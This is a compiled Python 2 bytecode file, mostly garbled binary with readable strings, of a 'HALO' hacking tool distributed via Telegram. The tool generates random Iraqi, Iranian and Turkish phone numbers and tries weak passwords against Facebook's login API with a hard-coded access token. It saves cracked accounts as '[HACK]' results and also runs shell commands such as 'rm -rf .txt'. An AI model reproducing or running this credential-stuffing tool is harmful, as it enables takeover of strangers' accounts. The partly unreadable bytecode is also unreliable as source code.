ó
ïn`c           @   s¼  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d   Z e   e  j d  xJ e d  D]< Z e j d d  Z e d d  e _ e GHe j j   qÆ Wy d  d l Z Wn e k
 r6e  j d	  n Xy d  d l Z WnE e k
 re  j d
  e j d  e  j d  e  j d  n Xd  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z d  d l Z d  d l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z  e  j! e"  e  j# e j$ j%   d d d/ g e  _& d0 g e  _& d   Z' d   Z( e  j d  d   Z) d   Z* d   Z+ d   Z, d Z- g  a. g  Z/ g  a0 d Z1 d  Z2 e  j d!  d  d l  Z  d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l Z d  d l	 Z	 d  d l
 Z
 d  d l Z e  j d  xJ e d"  D]< Z e j d d  Z e d d  e _ e GHe j j   qÝWy d  d l Z Wn e k
 rMe  j d#  n Xy d  d l Z WnE e k
 r¥e  j d$  e j d  e  j d%  e  j d  n Xd  d l m Z d  d l m Z d  d l m Z e e  e j d  e j   Z  e  j! e"  e  j# e j$ j%   d d d1 g e  _& d&   Z3 d'   Z, d(   Z4 d)   Z5 e  j d*  d+ Z6 e  j d*  d Z- g  Z7 g  a0 g  a. g  Z/ d,   Z8 d-   Z9 e: d. k r¸e8   n  d S(2   iÿÿÿÿNc          C   sÒ   t  t j    t  t j    }  d j |   } d | GHye t j d  j } | | k r d GHt  t j    } t j	 d  n d GHt j	 d  t
 j   Wn, t
 j   t d k rÎ t GHt   qÎ n Xd  S(   Nt   -s   [37;1mYour ID : s:   https://github.com/halocrak/halo.txt1/blob/main/Active.txts   [92mYOUR ID IS ACTIVE.........i   sZ   [91mBarezm Id kat active nya Tkaya bo Active krdn nama bnera bo telegram @halohack.......t   __main__(   t   strt   ost   geteuidt   getlogint   joint   requestst   gett   textt   timet   sleept   syst   exitt   namet   logot   chk(   t   uuidt   idt   httpCahtt   msg(    (    s   /sdcard/Download/Halo.pyR      s$    "	
s   rm -rf .txti  iGô i s   .txtt   as4   No Module Named Requests! type:pip2 install requestss6   No Module Named Mechanize! type:pip2 install mechanizei   s   Then type: python2 fbi.pys   xdg-open https://t.me/halohack(   t
   ThreadPool(   t   ConnectionError(   t   Browsert   utf8t   max_times
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]c           C   s   d GHt  j j   d  S(   Ns   Thanks.(   R   R   R   (    (    (    s   /sdcard/Download/Halo.pyt   keluarA   s    c         C   sS   d } d } x: t  D]2 } | d | t j d t |  d  | 7} q Wt |  S(   Nt   ahtdzjct    t   !i    i   (   t   xt   randomt   randintt   lent   cetak(   t   bt   wt   dt   i(    (    s   /sdcard/Download/Halo.pyt   acakF   s
    0s   mkdir anggaxd/cloned.txtc         C   s~   d } xA | D]9 } | j  |  } | j d | d t d |   } q W| d 7} | j d d  } t j j | d  d  S(   NR   s   !%ss   [%s;1mi   s   [0ms   !0s   
(   t   indext   replaceR   R   t   stdoutt   write(   R$   R%   R'   t   jR   (    (    s   /sdcard/Download/Halo.pyR#   O   s    (
c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
i   (   R   R+   R,   t   flushR
   R   (   t   zt   e(    (    s   /sdcard/Download/Halo.pyt   jalanZ   s    c          C   sF   d d d g }  x0 |  D]( } d | Gt  j j   t j d  q Wd  S(   Ns   .   s   ..  s   ... s   [1;93mPlease Wait [1;93mi   (   R   R+   R.   R
   R   (   t   titikt   o(    (    s   /sdcard/Download/Halo.pyt   tika   s
    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
i   (   R   R+   R,   R.   R
   R   (   R/   R0   (    (    s   /sdcard/Download/Halo.pyt   psbi   s    i    s   [31mNot Vulns	   [32mVulnt   cleari  s   pip2 install requestss   pip2 install mechanizes   python2 nmbr.pyc           C   s   d GHt  j j   d  S(   Ns   [!] Exit(   R   R   R   (    (    (    s   /sdcard/Download/Halo.pyt   exb   s    c         C   sC   x< |  d D]0 } t  j j |  t  j j   t j d  q Wd  S(   Ns   
i   (   R   R+   R,   R.   R
   R   (   R/   R0   (    (    s   /sdcard/Download/Halo.pyR5      s    c           C   s   t  j d  t j d  d  S(   Ni   s   xdg-open https://t.me/halohack(   R
   R   R   t   system(    (    (    s   /sdcard/Download/Halo.pyt   t¢   s    c           C   s   t  j d  t  j d  d  S(   NR6   s   xdg-open https://t.me/halohack(   R   R8   (    (    (    s   /sdcard/Download/Halo.pyt   cb§   s    s   filget HALOsÓ  
[91m
[91m
[97m
[97m$$\   $$\  $$$$$$\  $$\       $$$$$$\  
$$ |  $$ |$$  __$$\ $$ |     $$  __$$\ 
$$ |  $$ |$$ /  $$ |$$ |     $$ /  $$ |
$$$$$$$$ |$$$$$$$$ |$$ |     $$ |  $$ |
$$  __$$ |$$  __$$ |$$ |     $$ |  $$ |
$$ |  $$ |$$ |  $$ |$$ |     $$ |  $$ |
$$ |  $$ |$$ |  $$ |$$$$$$$$\ $$$$$$  |
\__|  \__|\__|  \__|\________|\______/ 
Talgram:STAF EROR404                   
TalgramMY:404EROR                                      
TalgramAdmin:404XATAR





c           C   sK   t  j d  t  j d  t GHd d GHd GHd GHd GHd d GHt   d  S(   NR6   s   xdg-open https://t.me/halohacki*   s   [1;91m:s8   [1;91m[1][1;92m zhmaray iraq    [1;91m[0][1;91m Exits   [1;91m[2][1;92m zhmaray irans    [1;91m[3][1;92m zhmaray turkya(   R   R8   R   t   action(    (    (    s   /sdcard/Download/Halo.pyt   menuË   s    		c             s  t  d  }  |  d k r' d GHt   nÿ|  d k rÆ t j d  t GHd GHyO t  d    d  d	 } x0 t | d
  j   D] } t j | j	    q{ WWq&t
 k
 rÂ d GHt  d  t   q&Xn`|  d k ret j d  t GHd GHyO t  d    d  d	 } x0 t | d
  j   D] } t j | j	    qWWq&t
 k
 rad GHt  d  t   q&XnÁ |  d k rt j d  t GHd GHyO t  d    d  d	 } x0 t | d
  j   D] } t j | j	    q¹WWq&t
 k
 r d GHt  d  t   q&Xn" |  d k rt   n d GHt   t t t   } t d |  t j d  t d  t j d  t d  t j d  d d GH   f d   } t d  } | j | t  d d GHd GHd t t t   d  t t t   GHd! GHt  d"  t j d#  d  S($   Ns)   
[1;91mSelect Option [1;93m>>>[1;95m  R   s   [!] Fill in correctlyt   1R6   s0   [1;92m 750  751 752 770 772 773 774 780 781 782s   [1;96m codek halbzhera  : s   +964s   .txtt   rs   [!] File Not Founds	   
[ Back ]t   2s0   901, 902, 903, 930, 933, 935, 936, 937, 938, 939s    choose code  : s   +98t   3s(   [1;96m322, 264, 416, 272, 472, 382, 312s   +90t   0s   [â] hamw raqa makan: g¹?s   [1;91meror404up...s+   [!] To Stop Process Press CTRL Then Press zg      à?i*   s   [1;91m=c   
         s%  |  } y t  j d  Wn t k
 r* n Xyì| } t j d    | d | d  } t j |  } d | k ré d    | d | d d GHt d	 d
  } | j    | d | d  | j   t	 j
   | |  n d | d k rhd    | d | d GHt d d
  } | j    | d | d  | j   t j
   | |  n d } t j d    | d | d  } t j |  } d | k r#d    | d | d d GHt d	 d
  } | j    | d | d  | j   t	 j
   | |  n d | d k r¢d    | d | d GHt d d
  } | j    | d | d  | j   t j
   | |  n d } t j d    | d | d  } t j |  } d | k r]d    | d | d d GHt d	 d
  } | j    | d | d  | j   t	 j
   | |  n d | d k rÜd    | d | d GHt d d
  } | j    | d | d  | j   t j
   | |  n d }	 t j d    | d |	 d  } t j |  } d | k rd    | d |	 d d GHt d	 d
  } | j    | d |	 d  | j   t	 j
   | |	  n d | d k rd    | d |	 d GHt d d
  } | j    | d |	 d  | j   t j
   | |	  n  Wn n Xd  S(   Nt   saves   https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s   &locale=en_US&password=sH   &sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt   access_tokens   [1;92m[HACK][1;92m s    >>> s   
s   save/successfull.txtR   s   >>>s   www.facebook.comt	   error_msgs   [1;91m[NOT HACK][1;91m s   save/checkpoint.txtt   1234erort
   1234512345t
   1122334455(   R   t   mkdirt   OSErrort   brt   opent   jsont   loadR,   t   closet   okst   appendt   cpb(
   t   argt   usert   pass1t   datat   qt   okbt   cpst   pass2t   pass3t   pass4(   t   ct   k(    s   /sdcard/Download/Halo.pyt   main  s    '!!
!
'!!
!
'!!
!
'!!
!
i   s,   [â][1;93m Process Has Been Completed ....s3   [â][1;92m Total successfull/[1;96mcheckpoint : t   /s9   [â][1;91m CP File Has Been Saved : save/checkpoint.txts   
[Press Enter To Go Back]s   python2 .README.md(   t	   raw_inputR;   R   R8   R   RK   t	   readlinesR   RP   t   stript   IOErrorR<   R7   R   R"   R5   R
   R   R   t   mapRO   RQ   (   t   bcht   idlistt   linet   xxxR^   t   p(    (   R\   R]   s   /sdcard/Download/Halo.pyR;   ×   s    






	J	)
R   (   s
   User-AgentsR   Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16(   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](   s
   user-agents  Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](;   R   R   R
   t   datetimeR    t   hashlibt   ret	   threadingRL   t   urllibt	   cookielibt   getpassR   R   R8   t   ranget   nR!   t   nmbrRK   R+   R.   t   ImportErrort	   mechanizeR   t   multiprocessing.poolR   t   requests.exceptionsR   R   t   reloadt   setdefaultencodingRJ   t   set_handle_robotst   Falset   set_handle_refresht   _httpt   HTTPRefreshProcessort
   addheadersR   R(   R#   R1   R4   R5   t   backRO   R   RQ   t   vulnott   vulnR7   R9   R:   R   t
   successfulR<   R;   t   __name__(    (    (    s   /sdcard/Download/Halo.pyt   <module>   s°   	
						
						